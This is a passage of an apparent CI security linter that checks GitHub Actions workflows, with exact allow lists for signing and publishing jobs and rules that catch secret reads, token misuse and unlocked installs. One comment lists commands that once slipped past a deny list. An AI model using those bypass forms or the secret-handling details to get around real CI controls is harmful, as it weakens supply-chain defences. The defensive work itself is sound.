        "got=\"sha512-$(openssl dgst -sha512 -binary \"$npm_tgz\" | base64 -w0)\"",
        "h=\x27([0-9a-f]{64})\x27",
        "id=\x27(0|[1-9][0-9]*|[0-9]*[A-Za-z-][0-9A-Za-z-]*)\x27",
        "integrity=\"$(npm view \"${1}@${VERSION}\" dist.integrity)\"",
        "manifest+=\"$1  $2\"$\x27\\n\x27",
        "manifest=\"\"",
        "names=\"$(tar --quoting-style=escape -tzf \"${tmp}/npm.tgz\")\"",
        "npm_tgz=\"$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION}.tgz\"",
        "ours=\"$(manifest .)\"",
        "pkg=\"@usejarvis/sidecar\"",
        "pkg=\"@usejarvis/sidecar-${platform}\"",
        "pkg_dir=\"sidecar/npm/${platform}\"",
        "re=\"^linux-x64=${h} linux-arm64=${h} darwin-arm64=${h} darwin-x64=${h} win32-x64=${h}\\$\"",
        "same=$?",
        "same=0",
        "sums=\"$(cd artifacts && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum | base64 -w0)\"",
        "theirs=\"$(manifest \"${tmp}/x/package\")\"",
        "tree=\"$(find sidecar/npm -mindepth 1 -printf \x27%y %P\\n\x27 | LC_ALL=C sort | tr \x27\\n\x27 \x27 \x27)\"",
        "tmp=\"$(mktemp -d)\"",
        "types=\"$(tar --quoting-style=escape -tvzf \"${tmp}/npm.tgz\" | cut -c1)\"",
        "url=\"$(npm view \"${1}@${VERSION}\" dist.tarball)\"",
        "want=\"$(printf \x27%s\x27 \"$manifest\" | cut -d\x27 \x27 -f3- | sort)\"",
      ],
    },
    "sign-sidecar-windows": {
      free: ["[", "cut", "echo", "exit", "sha256sum"],
      pinned: {
        find: [
          "find \"$in\" -mindepth 1 -print",
        ],
        install: [
          "install -m 0644 \"${in}/${SIDECAR_BIN}.exe\" \"${SIDECAR_BIN}.exe\"",
        ],
        "scripts/sign-windows.sh": [
          "scripts/sign-windows.sh --defer-verify \"${SIDECAR_BIN}.exe\"",
        ],
        set: [
          "set -euo pipefail",
        ],
      },
      funcs: [],
      arrays: [],
      fors: [],
      calls: [
      ],
      assigns: [
        "fix=\"Issue the certificate and commit sidecar/packaging/windows/codesign-chain.pem\"",
        "fix=\"Set the GCP_KMS_KEYRING repository variable\"",
        "in=\"${RUNNER_TEMP}/unsigned\"",
        "missing=\"\"",
        "missing=\"GCP_KMS_KEYRING is set but sidecar/packaging/windows/codesign-chain.pem is missing -- the certificate has not been issued/committed yet\"",
        "missing=\"Windows signing is not configured (GCP_KMS_KEYRING unset)\"",
      ],
    },
    "sign-windows": {
      free: ["[", "cut", "echo", "exit", "sha256sum"],
      pinned: {
        find: [
          "find \"$in\" -mindepth 1 -print",
        ],
        install: [
          "install -m 0644 \"${in}/Jarvis-Setup.exe\" Jarvis-Setup.exe",
        ],
        "scripts/sign-windows.sh": [
          "scripts/sign-windows.sh --defer-verify Jarvis-Setup.exe",
        ],
        set: [
          "set -euo pipefail",
        ],
      },
      funcs: [],
      arrays: [],
      fors: [],
      calls: [
      ],
      assigns: [
        "fix=\"Issue the certificate and commit sidecar/packaging/windows/codesign-chain.pem\"",
        "fix=\"Set the GCP_KMS_KEYRING repository variable\"",
        "in=\"${RUNNER_TEMP}/unsigned\"",
        "missing=\"\"",
        "missing=\"GCP_KMS_KEYRING is set but sidecar/packaging/windows/codesign-chain.pem is missing -- the certificate has not been issued/committed yet\"",
        "missing=\"Windows signing is not configured (GCP_KMS_KEYRING unset)\"",
      ],
    },
    "sign-sidecar-darwin": {
      free: ["[", "echo", "exit", "mkdir", "printf", "read", "test", "true", "umask"],
      pinned: {
        "/usr/bin/tar": [
          "/usr/bin/tar --no-mac-metadata -C \"${RUNNER_TEMP}/work/${leg}\" -czf \"${RUNNER_TEMP}/out/${leg}/jarvis-app.tar.gz\" Jarvis.app",
          "/usr/bin/tar -tvzf \"$tgz\"",
          "/usr/bin/tar -tzf \"$tgz\"",
          "/usr/bin/tar -xzf \"$tgz\" -C \"$dest\"",
        ],
        awk: [
          "awk -F\x27\"\x27 \x27/Developer ID Application/ {print $2; exit}\x27",
        ],
        base64: [
          "base64 -d",
        ],
        codesign: [
          "codesign --force --options runtime --timestamp --entitlements packaging/macos/entitlements.plist --sign \"$IDENTITY\" \"$app\"",
          "codesign --force --options runtime --timestamp --sign \"$IDENTITY\" \"${app}/Contents/MacOS/ocr-helper\"",
          "codesign --verify --strict --verbose=2 \"$app\"",
        ],
        ditto: [
          "ditto -c -k --keepParent \"$app\" \"$zip\"",
        ],
        export: [
          "export COPYFILE_DISABLE=1",
          "export LC_ALL=C",
        ],
        find: [
          "find \"$dest\" -mindepth 1 -maxdepth 1 -print",
          "find \"$dest\" -mindepth 1 -not -type d -not -type f -print",
          "find \"$dest\" -type f -links +1 -print",
          "find \"$in\" -mindepth 1 -not -type d -not -type f -print",
          "find \"$in\" -mindepth 1 -print",
        ],
        jq: [
          "jq -r \x27.id // empty\x27",
          "jq -r \x27.status // empty\x27",
        ],
        openssl: [
          "openssl rand -hex 24",
        ],
        rm: [
          "rm -f \"$cert\"",
        ],
        security: [
          "security create-keychain -p \"$KEYCHAIN_PASSWORD\" \"$kc\"",
          "security find-identity -v -p codesigning \"$kc\"",
          "security import \"$cert\" -k \"$kc\" -P \"$APPLE_CERT_PASSWORD\" -T /usr/bin/codesign",
          "security list-keychains -d user -s \"$kc\" login.keychain",
          "security set-key-partition-list -S apple-tool:,apple: -s -k \"$KEYCHAIN_PASSWORD\" \"$kc\"",
          "security set-keychain-settings -lut 3600 \"$kc\"",
          "security unlock-keychain -p \"$KEYCHAIN_PASSWORD\" \"$kc\"",
        ],
        set: [
          "set -euo pipefail",
        ],
        shasum: [
          "shasum -a 256 \"${RUNNER_TEMP}/out/${leg}/jarvis-app.tar.gz\"",
          "shasum -a 256 -c -",
        ],
        sort: [
          "sort",
        ],
        spctl: [
          "spctl --assess --type execute -vv \"$app\"",
        ],
        trap: [
          "trap \x27rm -f \"$cert\" \"$key\"; security list-keychains -d user -s login.keychain || true; security delete-keychain \"$kc\" || true\x27 EXIT",
        ],
        unset: [
          "unset APPLE_CERT_P12 APPLE_CERT_PASSWORD ASC_API_KEY_P8",
        ],
        xcrun: [
          "xcrun notarytool log \"$SUBMISSION_ID\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\"",
          "xcrun notarytool submit \"$zip\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\" --wait --timeout 30m --output-format json",
          "xcrun stapler staple \"$app\"",
        ],
      },
      funcs: [],
      arrays: [],
      fors: ["leg in darwin-arm64 darwin-x64"],
      calls: [],
      assigns: [
        "absent=\"\"",
        "absent=\"${absent:+${absent}, }APPLE_CERT_P12\"",
        "absent=\"${absent:+${absent}, }APPLE_CERT_PASSWORD\"",
        "absent=\"${absent:+${absent}, }ASC_KEY_ID\"",
        "absent=\"${absent:+${absent}, }ASC_ISSUER_ID\"",
        "absent=\"${absent:+${absent}, }ASC_API_KEY_P8\"",
        "IDENTITY=\"$(security find-identity -v -p codesigning \"$kc\" | awk -F\x27\"\x27 \x27/Developer ID Application/ {print $2; exit}\x27)\"",
        "KEYCHAIN_PASSWORD=\"$(openssl rand -hex 24)\"",
        "NOTARY_STATUS=\"$(echo \"$SUBMIT_JSON\" | jq -r \x27.status // empty\x27)\"",
        "SUBMISSION_ID=\"$(echo \"$SUBMIT_JSON\" | jq -r \x27.id // empty\x27)\"",
        "SUBMIT_JSON=\"$(xcrun notarytool submit \"$zip\" \\\n    --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\" \\\n    --wait --timeout 30m --output-format json)\"",
        "app=\"${RUNNER_TEMP}/work/${leg}/Jarvis.app\"",
        "cert=\"${RUNNER_TEMP}/cert.p12\"",
        "dest=\"${RUNNER_TEMP}/work/${leg}\"",
        "in=\"${RUNNER_TEMP}/unsigned\"",
        "kc=\"${RUNNER_TEMP}/sign.keychain-db\"",
        "key=\"${RUNNER_TEMP}/asc_key.p8\"",
        "names=\"$(/usr/bin/tar -tzf \"$tgz\")\"",
        "sum=\"$(shasum -a 256 \"${RUNNER_TEMP}/out/${leg}/jarvis-app.tar.gz\")\"",
        "sum=\"${sum%% *}\"",
        "tgz=\"${RUNNER_TEMP}/unsigned/${leg}/jarvis-app.tar.gz\"",
        "want=\"$(printf \x27%s\\n\x27 \"${in}/darwin-arm64\" \"${in}/darwin-arm64/jarvis-app.tar.gz\" \"${in}/darwin-x64\" \"${in}/darwin-x64/jarvis-app.tar.gz\")\"",
        "zip=\"${RUNNER_TEMP}/Jarvis-${leg}.zip\"",
      ],
      writes: ["\"$cert\"", "\"$key\""],
    },
    "sign-macos": {
      free: ["[", "echo", "exit", "mkdir", "printf", "read", "test", "true", "umask"],
      pinned: {
        "/usr/bin/tar": [
          "/usr/bin/tar -tvzf \"$tgz\"",
          "/usr/bin/tar -tzf \"$tgz\"",
          "/usr/bin/tar -xzf \"$tgz\" -C \"$dest\"",
        ],
        awk: [
          "awk -F\x27\"\x27 \x27/Developer ID Application/ {print $2; exit}\x27",
        ],
        base64: [
          "base64 -d",
        ],
        codesign: [
          "codesign --force --options runtime --timestamp --sign \"$IDENTITY\" \"$APP\"",
          "codesign --force --timestamp --sign \"$IDENTITY\" \"$DMG\"",
          "codesign --verify --strict --verbose=2 \"$APP\"",
        ],
        ditto: [
          "ditto -c -k --keepParent \"$APP\" \"${RUNNER_TEMP}/InstallJarvis.zip\"",
        ],
        export: [
          "export LC_ALL=C",
        ],
        find: [
          "find \"$dest\" -mindepth 1 -maxdepth 1 -print",
          "find \"$dest\" -mindepth 1 -not -type d -not -type f -print",
          "find \"$dest\" -type f -links +1 -print",
          "find \"$in\" -mindepth 1 -print",
        ],
        hdiutil: [
          "hdiutil create -volname \"Install Jarvis\" -srcfolder \"$APP\" -format UDZO -ov \"$DMG\"",
          "hdiutil create -volname \"Install Jarvis\" -srcfolder \"${RUNNER_TEMP}/work/Install Jarvis.app\" -format UDZO -ov \"${RUNNER_TEMP}/out/Install-Jarvis.dmg\"",
        ],
        jq: [
          "jq -r \x27.id // empty\x27 \"${RUNNER_TEMP}/notary-app.json\"",
          "jq -r \x27.id // empty\x27 \"${RUNNER_TEMP}/notary-dmg.json\"",
          "jq -r \x27.status // empty\x27 \"${RUNNER_TEMP}/notary-app.json\"",
          "jq -r \x27.status // empty\x27 \"${RUNNER_TEMP}/notary-dmg.json\"",
        ],
        openssl: [
          "openssl rand -hex 24",
        ],
        rm: [
          "rm -f \"$cert\"",
        ],
        security: [
          "security create-keychain -p \"$KEYCHAIN_PASSWORD\" \"$kc\"",
          "security find-identity -v -p codesigning \"$kc\"",
          "security import \"$cert\" -k \"$kc\" -P \"$APPLE_CERT_PASSWORD\" -T /usr/bin/codesign",
          "security list-keychains -d user -s \"$kc\" login.keychain",
          "security set-key-partition-list -S apple-tool:,apple: -s -k \"$KEYCHAIN_PASSWORD\" \"$kc\"",
          "security set-keychain-settings -lut 3600 \"$kc\"",
          "security unlock-keychain -p \"$KEYCHAIN_PASSWORD\" \"$kc\"",
        ],
        set: [
          "set -euo pipefail",
        ],
        shasum: [
          "shasum -a 256 \"${RUNNER_TEMP}/out/Install-Jarvis.dmg\"",
          "shasum -a 256 -c -",
        ],
        spctl: [
          "spctl --assess --type open --context context:primary-signature -vv \"$DMG\"",
        ],
        tee: [
          "tee \"${RUNNER_TEMP}/notary-app.json\"",
          "tee \"${RUNNER_TEMP}/notary-dmg.json\"",
        ],
        trap: [
          "trap \x27rm -f \"$cert\" \"$key\"; security list-keychains -d user -s login.keychain || true; security delete-keychain \"$kc\" || true\x27 EXIT",
        ],
        unset: [
          "unset APPLE_CERT_P12 APPLE_CERT_PASSWORD ASC_API_KEY_P8",
        ],
        xcrun: [
          "xcrun notarytool log \"$APP_ID\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\"",
          "xcrun notarytool log \"$DMG_ID\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\"",
          "xcrun notarytool submit \"$DMG\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\" --wait --timeout 30m --output-format json",
          "xcrun notarytool submit \"${RUNNER_TEMP}/InstallJarvis.zip\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\" --wait --timeout 30m --output-format json",
          "xcrun stapler staple \"$APP\"",
          "xcrun stapler staple \"$DMG\"",
        ],
      },
      funcs: [],
      arrays: [],
      fors: [],
      calls: [],
      assigns: [
        "absent=\"\"",
        "absent=\"${absent:+${absent}, }APPLE_CERT_P12\"",
        "absent=\"${absent:+${absent}, }APPLE_CERT_PASSWORD\"",
        "absent=\"${absent:+${absent}, }ASC_KEY_ID\"",
        "absent=\"${absent:+${absent}, }ASC_ISSUER_ID\"",
        "absent=\"${absent:+${absent}, }ASC_API_KEY_P8\"",
        "APP=\"${RUNNER_TEMP}/work/Install Jarvis.app\"",
        "APP_ID=\"$(jq -r \x27.id // empty\x27 \"${RUNNER_TEMP}/notary-app.json\")\"",
        "DMG=\"${RUNNER_TEMP}/out/Install-Jarvis.dmg\"",
        "DMG_ID=\"$(jq -r \x27.id // empty\x27 \"${RUNNER_TEMP}/notary-dmg.json\")\"",
        "IDENTITY=\"$(security find-identity -v -p codesigning \"$kc\" | awk -F\x27\"\x27 \x27/Developer ID Application/ {print $2; exit}\x27)\"",
        "KEYCHAIN_PASSWORD=\"$(openssl rand -hex 24)\"",
        "cert=\"${RUNNER_TEMP}/cert.p12\"",
        "dest=\"${RUNNER_TEMP}/work\"",
        "in=\"${RUNNER_TEMP}/unsigned\"",
        "kc=\"${RUNNER_TEMP}/sign.keychain-db\"",
        "key=\"${RUNNER_TEMP}/asc_key.p8\"",
        "names=\"$(/usr/bin/tar -tzf \"$tgz\")\"",
        "sum=\"$(shasum -a 256 \"${RUNNER_TEMP}/out/Install-Jarvis.dmg\")\"",
        "tgz=\"${RUNNER_TEMP}/unsigned/install-jarvis-app.tar.gz\"",
      ],
      writes: ["\"$cert\"", "\"$key\""],
    },
  };
  const writesOidc = (perm) => perm === "write-all" || (perm && typeof perm === "object" && perm["id-token"] === "write");
  const outOps = new Set([">", ">>", ">|", "&>", "&>>", "<>"]);
  for (const [name, job] of Object.entries(jobs)) {
    if (typeof job.uses === "string") continue;
    const steps = flatSteps(job.steps);
    const allText = steps.map(({ st }) => typeof st.run === "string" ? st.run : "").join("\n");
    const allow = Object.hasOwn(runAllow, name) ? runAllow[name] : null;
    // Every job holding id-token has a list, whatever it runs: one that
    // only had to when it ran npm publish let an added job, or a signer,
    // download and run anything (security review of #1029).
    // #870 review: a job that reads the Apple or App Store Connect secrets
    // is held to a list too. narrow refuses toolchains by name, and a deny
    // list is never complete (bash x, osascript x, arch -arm64 x, env -S x
    // all passed it), so here every command it runs is listed instead.
    const appleSecrets = /\bsecrets\s*(?:\.\s*|\[\s*\\?[\x27"])(?:APPLE_|ASC_)/i.test(JSON.stringify({ env: doc.env, job }));
    if (!allow) {
      if (writesOidc(job.permissions ?? doc.permissions))
        out.push(name + ": holds id-token and has no list of the commands it may run (#1029): add one to runAllow");
      if (appleSecrets)
        out.push(name + ": reads the Apple signing secrets and has no list of the commands it may run (#870): add one to runAllow");
      continue;
    }
    if (process.env.RUNS_REPORT) out.push("checked " + name);
    const listed = new Set([...allow.free, ...Object.keys(allow.pinned)]);
    for (const f of allow.funcs) if (listed.has(f)) out.push(name + ": runAllow lists " + f + " as a function and as a command");
    const used = { free: new Set(), forms: new Set(), funcs: new Set(), arrays: new Set(), fors: new Set(), calls: new Set(), assigns: new Set(), writes: new Set() };
    const plainShell = ["bash", "bash -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
    for (const [i, { st, via }] of steps.entries()) {
      if (typeof st.run !== "string") continue;
      const label = name + ": step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (st.name ?? st.id ?? st.uses ?? String(i));
      // shRead reads bash, so the step must run in bash.
      const sh = st.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell;
      if (sh !== undefined && !plainShell.includes(String(sh).trim())) out.push(label + " runs in shell: " + sh + ", which this rule does not read (#1029)");
      const r = shRead(st.run);
      for (const u of r.unread) out.push(label + " holds " + u + ", which this rule does not read (#1029)");
      for (const f of r.funcs) {
        used.funcs.add(f);
        if (listed.has(f)) out.push(label + " defines a function " + f + " over a command (#1029)");
        else if (!allow.funcs.includes(f)) out.push(label + " defines a function " + f + ", which is not on the " + name + " list (#1029)");
      }
      for (const a of r.arrays) {
        const key = a.name + "=(" + a.items.join(" ") + ")";
        used.arrays.add(key);
        if (!allow.arrays.includes(key)) out.push(label + " sets the array " + key + ", which is not on the " + name + " list (#1029)");
      }
      for (const fl of r.fors) {
        const key = fl.v + " in " + fl.items.join(" ");
        used.fors.add(key);
        if (!allow.fors.includes(key)) out.push(label + " loops over " + key + ", which is not on the " + name + " list (#1029)");
      }
      for (const c of r.cmds) {
        for (const rd of c.redirs)
          if (outOps.has(rd.op) && (allow.writes ?? []).includes(rd.target)) used.writes.add(rd.target);
          else if ((outOps.has(rd.op) && rd.target !== "/dev/null" && rd.target !== "\"$GITHUB_OUTPUT\"") ||
              ((rd.op === ">&" || rd.op === "<&") && !/^(?:[0-9]+|-)$/.test(rd.target)))
            out.push(label + " writes to " + rd.target + " (only /dev/null, $GITHUB_OUTPUT or another descriptor) (#1029)");
        if (c.name === null) {
          for (const a of c.assigns) {
            if (/^[A-Za-z_][A-Za-z0-9_]*\+?=\(/.test(a)) continue;
            used.assigns.add(a);
            if (!allow.assigns.includes(a)) out.push(label + " assigns " + JSON.stringify(a) + ", which is not on the " + name + " list (#1029)");
          }
          continue;
        }
        // IFS= in front of read changes only how that read splits its line.
        for (const a of c.assigns) if (a !== "LC_ALL=C" && !(a === "IFS=" && c.name === "read")) out.push(label + " runs " + c.name + " with " + a + " in front, where only LC_ALL=C may go (#1029)");
        if (!Object.hasOwn(allow.pinned, c.name) && !/^(?:[A-Za-z_][A-Za-z0-9_.-]*|\[)$/.test(c.name)) {
          out.push(label + " runs " + c.name + ", which is not a plain command name this rule can check (a path or an expansion) (#1029)");
          continue;
        }
        if (r.funcs.includes(c.name)) {
          const call = [c.name, ...c.words].join(" ");
          used.calls.add(call);
          if (!allow.calls.includes(call)) out.push(label + " calls " + JSON.stringify(call) + ", which is not one of the calls listed (#1029)");
          continue;
        }
        if (allow.funcs.includes(c.name)) { out.push(label + " calls " + c.name + ", a function this step does not define (#1029)"); continue; }
        const form = [c.name, ...c.words].join(" ");
        if (Object.hasOwn(allow.pinned, c.name)) {
          used.forms.add(form);
          if (!allow.pinned[c.name].includes(form)) out.push(label + " runs " + JSON.stringify(form) + ", which is not one of the forms listed for " + c.name + " (#1029)");
        } else if (allow.free.includes(c.name)) used.free.add(c.name);
        else out.push(label + " runs " + c.name + ", which is not on the " + name + " list (#1029)");
        if (c.name === "printf" && c.words.some((w) => /^-v/.test(w))) out.push(label + " runs printf -v, which sets a variable this rule cannot see (#1029)");
      }
    }
    // Exactly what the job runs: nothing listed that no step uses.
    const stale = (kind, x) => out.push(name + ": runAllow lists the " + kind + " " + JSON.stringify(x) + ", which no step of the job runs any more: remove it (#1029)");
    for (const x of allow.free) if (!used.free.has(x)) stale("command", x);
    for (const forms of Object.values(allow.pinned)) for (const f of forms) if (!used.forms.has(f)) stale("form", f);
    for (const x of allow.funcs) if (!used.funcs.has(x)) stale("function", x);
    for (const x of allow.arrays) if (!used.arrays.has(x)) stale("array", x);
    for (const x of allow.fors) if (!used.fors.has(x)) stale("for list", x);
    for (const x of allow.calls) if (!used.calls.has(x)) stale("call", x);
    for (const x of allow.assigns) if (!used.assigns.has(x)) stale("assignment", x);
    for (const x of allow.writes ?? []) if (!used.writes.has(x)) stale("write target", x);
  }
}
if (rule === "scoped" && doc.permissions === undefined)
  for (const [name, job] of Object.entries(jobs))
    if (job.permissions === undefined)
      out.push(name + ": no permissions of its own and none at the top level, so it inherits the repository default");
if (rule === "publish-perms") {
  const top = doc.permissions;
  if (!(top && typeof top === "object" && Object.keys(top).length === 0))
    out.push("top-level permissions must be {} (got " + JSON.stringify(top) + ")");
  for (const [name, job] of Object.entries(jobs))
    if (job.permissions === undefined) out.push(name + ": declares no permissions of its own");
}
// Whether the workflow holds authority (see header). The authority rule
// prints it; mutable reads it too, to hold the cache restores of a workflow
// that holds none to the exact-key form instead of refusing them (#1047).
const holdsAuthority = () => {
  const grants = (perm) => perm === "write-all" ||
    (perm && typeof perm === "object" && Object.values(perm).some((v) => v === "write"));
  const on = doc.on ?? doc[true] ?? {};
  const triggers = typeof on === "string" ? [on] : Array.isArray(on) ? on : Object.keys(on);
  // A secret is authority whatever the token scopes (#687): the code that
  // can read it is the code this rule exists to pin. GITHUB_TOKEN is the
  // token itself, whose scope the permissions blocks already describe.
  // Read inside expressions only, so a `secrets:` mapping key does not count
  // by itself (its values are expressions and do), and the whole context --
  // toJSON(secrets), secrets[...] -- counts.
  // Context names are case-insensitive to GitHub, and an expression can
  // hold braces (format strings), so read up to the closing }} lazily.
  const exprs = [...JSON.stringify({ env: doc.env, jobs }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map((m) => m[1]);
  const secret = exprs.some((e) => /\bsecrets\b(?!\s*\.\s*GITHUB_TOKEN\b)/i.test(e));
  return Boolean(grants(doc.permissions) || Object.values(jobs).some((j) => grants(j.permissions)) ||
      triggers.includes("pull_request_target") || secret || Object.values(jobs).some((j) => j.secrets === "inherit"));
};
if (rule === "authority" && holdsAuthority()) out.push("yes");
if (rule === "reach") {
  // Prints "yes" when a push or a pull request can start the workflow (#984).
  // The triggers that cannot are listed, not the ones that can: an event
  // added later (workflow_run, merge_group, a workflow_call from a PR
  // workflow, a repository_dispatch the PAT can send) counts until it is
  // argued for here. Branch and path filters are not read: a bot PR touches
  // whatever its workflow adds, and a filter is not a boundary.
  const on = doc.on ?? doc[true] ?? {};
  const triggers = typeof on === "string" ? [on] : Array.isArray(on) ? on : Object.keys(on);
  const quiet = new Set(["schedule", "workflow_dispatch"]);
  if (!triggers.length || triggers.some((t) => !quiet.has(String(t)))) out.push("yes");
}
if (rule === "opens-pr") {
  // Prints "yes" when a step, local actions included, is create-pull-request:
  // every such workflow is held to catalog-pr below (#983), not a list. And
  // "gh" when a run: opens one through gh or the pulls API instead (review
  // of #983), which catalog-pr cannot read: those are listed below.
  const steps = Object.values(jobs).flatMap((job) => flatSteps(job.steps).map((x) => x.st));
  if (steps.some((st) => String(st.uses ?? "").toLowerCase().startsWith("peter-evans/create-pull-request@"))) out.push("yes");
  else if (steps.some((st) => typeof st.run === "string" && /\bgh\s+pr\s+create\b|\bgh\s+api\b[^\n]*\/pulls\b/.test(st.run))) out.push("gh");
}
if (rule === "catalog-pr") {
  // Every bot PR (#983: the webview_go bump too, since #981 the catalog), as
  // the catalog PR was first:
  // The catalog PR is opened with RELEASE_PR_TOKEN, never GITHUB_TOKEN: GitHub
  // holds the CI of a PR that GITHUB_TOKEN opens or pushes for approval, so
  // main never sees its required `test` check and the PR cannot merge (#935).
  // No fallback to GITHUB_TOKEN either, which would reopen that silently. And
  // the job refuses first, through env and a run step (the secrets context is
  // not dependable in an `if:`), under the same condition as the PR step, so
  // a missing secret fails with a reason instead of opening a dead PR.
  const pat = /^\$\{\{\s*secrets\.RELEASE_PR_TOKEN\s*\}\}$/;
  let prSteps = 0;
  for (const [name, job] of Object.entries(jobs)) {
    const steps = flatSteps(job.steps).map((x) => x.st);
    steps.forEach((s, i) => {
      if (!String(s.uses ?? "").toLowerCase().startsWith("peter-evans/create-pull-request@")) return;
      prSteps++;
      const label = name + ": step " + (s.name ?? s.id ?? String(i));
      for (const k of ["token", "branch-token"])
        if ((k === "token" || s.with?.[k] !== undefined) && !pat.test(String(s.with?.[k] ?? "")))
          out.push(label + ": " + k + " is " + JSON.stringify(s.with?.[k] ?? "the default github.token") + ", not secrets.RELEASE_PR_TOKEN alone");
      // The exit 1 has to sit inside the [ -z ] branch, and neither the step
      // nor the job may carry continue-on-error, which turns the refusal
      // into a warning and lets the dead PR open anyway.
      const refuses = !job["continue-on-error"] && steps.slice(0, i).some((r) => {
        const vars = Object.entries(r.env ?? {}).filter(([, v]) => pat.test(String(v))).map(([k]) => k);
        // Comments dropped first, so an `exit 1` in one does not count.
        const run = (typeof r.run === "string" ? r.run : "").split("\n").map((l) => l.replace(/(^|\s)#.*$/, "")).join("\n");
        return vars.some((v) => new RegExp("\\[ -z \"\\$\\{?" + v + "\\}?\" \\][^\\n]*\\bthen\\b(?:(?!\\bfi\\b)[^])*?\\bexit 1\\b[^]*?\\bfi\\b").test(run)) &&
          !r["continue-on-error"] && (r.if === undefined || r.if === s.if);
      });
      if (!refuses)
        out.push(label + ": no earlier step refuses when RELEASE_PR_TOKEN is empty (env, a [ -z ] test and exit 1, under the same condition)");
    });
  }
  if (prSteps === 0) out.push("no peter-evans/create-pull-request step, so nothing here opens the catalog PR");
  // The PAT appears exactly twice: the PR step token and the refusal env.
  // Anywhere else it reaches code this rule has not looked at.
  const patUses = [...JSON.stringify({ env: doc.env, jobs }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)]
    .filter((m) => /\bsecrets\s*(?:\.\s*RELEASE_PR_TOKEN\b|\[\s*[\x27"]RELEASE_PR_TOKEN[\x27"]\s*\])/i.test(m[1])).length;
  if ([...JSON.stringify({ env: doc.env, jobs }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)].some((m) => /\bsecrets\b\s*(?![\s.\[])/i.test(m[1])))
    out.push("the whole secrets context is read somewhere (toJSON(secrets) or similar), which includes RELEASE_PR_TOKEN");
  if (patUses !== 2) out.push("secrets.RELEASE_PR_TOKEN is read " + patUses + " times; expected 2 (the PR step token and the refusal env)");
}
if (rule === "untrusted") {
  // A job that installs dependencies (whose lifecycle scripts run arbitrary
  // code from the registry) or processes third-party data holds no write scope
  // and no id-token, and installs only what the lockfile records (#686).
  const writes = (perm) => perm === "write-all" ||
    (perm && typeof perm === "object" && Object.values(perm).some((v) => v === "write"));
  // Installs, updates and package runners, with any flags before the verb
  // (`bun --cwd x install`). A global `npm install -g <pkg>` is not an
  // install of the repository dependencies and is not matched.
  const flags = "(?:\\s+--?[\\w-]+(?:=\\S+)?(?:\\s+(?!-)(?!(?:install|i|add|update|x|ci|exec|dlx)\\b)\\S+)?)*";
  const install = new RegExp("\\b(?:bun" + flags + "\\s+(?:install|i|add|update|x)|npm" + flags +
    "\\s+(?:ci|install|i|add|update|exec|x)(?!\\s+(?:-g|--global)\\b)|pnpm" + flags +
    "\\s+(?:install|i|add|update|dlx|exec)|yarn|bunx|npx)\\b");
  const bunInstall = new RegExp("\\bbun" + flags + "\\s+(?:install|i)\\b");
  const frozen = /--frozen-lockfile(?![=\w-])/;
  const thirdParty = /\bscripts\/(sync-pieces-catalog|inspect-verified-pieces|check-piece-licenses)\.ts\b/;
  // #983: a Go build, vet or test compiles and runs module code (the webview
  // bump links fresh upstream code into the sidecar tests), and a script of
  // this repository (scripts/vendor-webview.sh fetches that upstream code)
  // is repository code. Neither runs where a write scope or a secret is held.
  // go -C dir test, and go tool, too; a script path behind a directory
  // ($GITHUB_WORKSPACE/scripts/x, .github/scripts/x) too (review of #983).
  const goCode = /(?:^|[\s;&|(])go\s+(?:-C\s+\S+\s+)?(?:build|test|vet|run|generate|install|get|mod|tool)\b/;
  const repoScript = /(?:^|[\s;&|(\/])(?:\.\/)?scripts\/[\w.\/-]+/;
  // One logical line per command: continuations joined, comments dropped, and
  // quoted text blanked so an `echo "bun install failed"` is not an install.
  let pkgScripts = {};
  try { pkgScripts = JSON.parse(require("node:fs").readFileSync(process.env.REPO + "/package.json", "utf8")).scripts ?? {}; } catch {}
  const lines = (run) => run.replace(/\\\n/g, " ").split("\n").map((l) => l.trim())
    .filter((l) => l && !l.startsWith("#"))
    .map((l) => {
      // Text handed to a shell (`bash -c "bun install"`) is a command, so it
      // stays; and `bun run <name>` is expanded through package.json scripts,
      // so an alias of the generator is the generator.
      const bare = /\b(?:ba|z)?sh\s+-c\b/.test(l) ? l
        : l.replace(/"(?:[^"\\]|\\.)*"/g, "\"\"").replace(/\x27[^\x27]*\x27/g, "\"\"");
      // Every script name on the line, after any flags, expanded until no
      // new name appears (an alias of an alias), with a cycle guard.
      // Flags may take a value (`--cwd .`, `--prefix x`) on either side of
      // `run`, and the name may be quoted, so names are read from the line
      // with quotes removed rather than blanked.
      const fl = "(?:\\s+--?[\\w-]+(?:[= ](?!-)(?!run\\b)[^\\s;&|]+)?)*";
      const nameRe = new RegExp("\\b(?:bun|npm|pnpm|yarn)" + fl + "(?:\\s+(?:run|run-script))?" + fl + "\\s+(?!-)([\\w:.-]+)", "g");
      const names = (text) => [...text.replace(/["\x27]/g, "").matchAll(nameRe)].map((m) => m[1]);
      const seen = new Set();
      let expanded = bare;
      for (let todo = names(l); todo.length; ) {
        const n = todo.shift();
        if (seen.has(n) || !Object.hasOwn(pkgScripts, n)) continue;
        seen.add(n);
        expanded += " ; " + pkgScripts[n];
        todo.push(...names(pkgScripts[n]));
        // npm and bun run pre<name> and post<name> around it.
        for (const hook of ["pre" + n, "post" + n]) if (Object.hasOwn(pkgScripts, hook)) todo.push(hook);
      }
      return [l, expanded];
    });
  // A job holds write when its GITHUB_TOKEN does, and also when it reads any
  // other secret: the catalog PR is pushed with a PAT, so a publish job whose
  // GITHUB_TOKEN is read-only still holds a credential that can write.
